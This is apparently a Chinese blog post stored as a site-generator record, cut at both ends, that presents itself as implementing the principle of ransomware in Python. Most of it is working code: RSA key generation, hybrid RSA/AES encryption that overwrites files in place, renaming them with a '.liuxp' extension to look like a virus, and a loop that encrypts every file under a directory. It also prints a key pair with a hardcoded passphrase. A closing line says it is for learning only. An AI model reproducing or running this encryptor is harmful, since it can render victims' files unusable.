nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# 解密代码\n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # 遍历文件，加密并且改名\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # 遍历文件，解密并且恢复名字\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# 加密代码\ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # 切换加密和解密过程\n        # if False:   # 解密文件\n        if True:  # 加密文件\n            # 遍历文件，加密并且改名\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # 遍历文件，解密并且恢复名字\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\n唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。\n\n以下是几个实现的效果图：\n\n![加密之前](./Python-encrypted-file/1.png)\n\n![加密之后](./Python-encrypted-file/2.png)\n\n![解密之后](./Python-encrypted-file/3.png)\n\n### 写在后面的话\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！","source":"_posts/Python-encrypted-file.md","raw":"---\ntitle: 使用Python加密文件\ndate: 2023-04-17 22:03:13\ncategories: 技术\ntags:\n    - python\n---\n\n### 功能\n\n用Python实现对文件的加密和解密，即ransomware的代码原理实现。\n\n### 序\n\n如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\\Python\\Lib\\site-packages\\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。\n\n### 秘钥生成\n\n准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！\n\n如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # 生成 2048 位的 RSA 密钥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 生成私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 生成公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\n当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。\n\n公钥：\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\n私钥：\n\n```bash 折叠代码\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\n当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。\n\n### 文件加密\n\n现在我们来看看如何对文件进行加密处理：\n\n```bash 折叠代码\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # 二进制只读打开文件，读取文件数据\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # 一个 16 字节的会话密钥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\n我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。\n\n加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。\n\n### 私钥解密\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\n我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。\n\n接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。\n\n解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！\n\n### 变更文件名\n\n当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：\n\n举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\n使用了base64对文件名进行编码。\n\n### 恢复文件名\n\n举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\n使用了base64对文件进行解码。\n\n### 完整源码\n\n我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：\n\n```bash 折叠代码\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# 解密代码\n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # 遍历文件，加密并且改名\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # 遍历文件，解密并且恢复名字\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# 加密代码\ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # 切换加密和解密过程\n        # if False:   # 解密文件\n        if True:  # 加密文件\n            # 遍历文件，加密并且改名\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # 遍历文件，解密并且恢复名字\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\n唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。\n\n以下是几个实现的效果图：\n\n![加密之前](./Python-encrypted-file/1.png)\n\n![加密之后](./Python-encrypted-file/2.png)\n\n![解密之后](./Python-encrypted-file/3.png)\n\n### 写在后面的话\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！","slug":"Python-encrypted-file","published":1,"updated":"2024-05-03T03:55:54.825Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ee003b7zj32bng4jdr","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><p>用Python实现对文件的加密和解密，即ransomware的代码原理实现。</p>\n<h3 id=\"序\"><a href=\"#序\" class=\"headerlink\" title=\"序\"></a>序</h3><p>如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<span id=\"more\"></span>比如<a href=\"https://blog.csdn.net/yilovexing/article/details/104011199\">这个</a>，也可以下载<a href=\"https://www.aliyundrive.com/s/HcrQHfdUYMi\">我提供的文件</a>，然后把下载两个文件夹复制到Python环境的<code>F:\\Python\\Lib\\site-packages\\</code>文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。</p>\n<h3 id=\"秘钥生成\"><a href=\"#秘钥生成\" class=\"headerlink\" title=\"秘钥生成\"></a>秘钥生成</h3><p>准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！</p>\n<p>如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def CreateRSAKeys():</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 生成 2048 位的 RSA 密钥</span></span><br><span class=\"line\">    key = RSA.generate(2048)</span><br><span class=\"line\">    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=<span class=\"string\">&quot;scryptAndAES128-CBC&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 生成私钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(encrypted_key)</span><br><span class=\"line\">    <span class=\"comment\"># 生成公钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(key.publickey().exportKey())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CreateRSAKeys()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。</p>\n<p>公钥：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN PUBLIC KEY-----</span><br><span class=\"line\">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3</span><br><span class=\"line\">40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC</span><br><span class=\"line\">hDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq</span><br><span class=\"line\">Ic/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP</span><br><span class=\"line\">G8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL</span><br><span class=\"line\">3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90</span><br><span class=\"line\">UQIDAQAB</span><br><span class=\"line\">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>私钥：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN ENCRYPTED PRIVATE KEY-----</span><br><span class=\"line\">MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA</span><br><span class=\"line\">AgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT</span><br><span class=\"line\">IgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB</span><br><span class=\"line\">UuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi</span><br><span class=\"line\">wYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa</span><br><span class=\"line\">PVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR</span><br><span class=\"line\">1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI</span><br><span class=\"line\">TZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv</span><br><span class=\"line\">mrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK</span><br><span class=\"line\">1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx</span><br><span class=\"line\">ha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM</span><br><span class=\"line\">RU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe</span><br><span class=\"line\">2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02</span><br><span class=\"line\">vQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk</span><br><span class=\"line\">hY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8</span><br><span class=\"line\">J4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3</span><br><span class=\"line\">purKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V</span><br><span class=\"line\">XP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1</span><br><span class=\"line\">LBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm</span><br><span class=\"line\">ehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T</span><br><span class=\"line\">ZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt</span><br><span class=\"line\">aYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5</span><br><span class=\"line\">7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF</span><br><span class=\"line\">IiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV</span><br><span class=\"line\">/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX</span><br><span class=\"line\">AjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS</span><br><span class=\"line\">+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W</span><br><span class=\"line\">G5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==</span><br><span class=\"line\">-----END ENCRYPTED PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。</p>\n<h3 id=\"文件加密\"><a href=\"#文件加密\" class=\"headerlink\" title=\"文件加密\"></a>文件加密</h3><p>现在我们来看看如何对文件进行加密处理：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 